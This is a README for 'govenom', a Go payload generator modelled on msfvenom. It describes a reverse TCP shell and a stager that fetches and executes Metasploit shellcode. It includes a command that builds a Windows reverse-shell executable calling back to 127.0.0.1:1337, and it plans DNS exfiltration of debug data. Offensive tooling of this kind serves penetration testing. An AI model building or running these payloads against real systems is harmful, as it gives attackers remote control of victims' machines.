# govenom

`govenom` is a `msfvenom`-inspired payload generator written in
Go. This makes it easy to cross-compile static binaries for a
variety of target platforms, although currently `govenom` has a
strong focus on Windows as payload target platform.

## Payloads

Currently, two payloads are supportet:

**reverse_shell:** A simple yet robust reverse TCP shell. A simple
heuristic determines the must suitable shell executable. In contrast
to most other available shells out there, additional info is sent
through the same TCP connection such that points of failure can be
narrowed down.

**stager**: A TCP based shellcode stager that is compatible with
Metasploits `exploits/multi/handler` with a `meterpreter/reverse_tcp`
payload. It first reads a 4 Byte shellcode length and then the
shellcode itself from a TCP connection and executes it.

## Usage

Run `go run govenom.go` for detailed usage information. The following
example generates the reverse_shell for a 32-Bit Windows target that
connects back to `127.0.0.1:1337`:

```
go run .\govenom.go reverse_shell -d 127.0.0.1:1337 --os windows --arch 386 -o revsh.exe
```

## Planned Features

Currently, a debug log mechanism is under development that allows the
payloads to report errors or debug information through a variety of
exfiltration channels such as DNS. That way, the reason for payload
failure can be determined.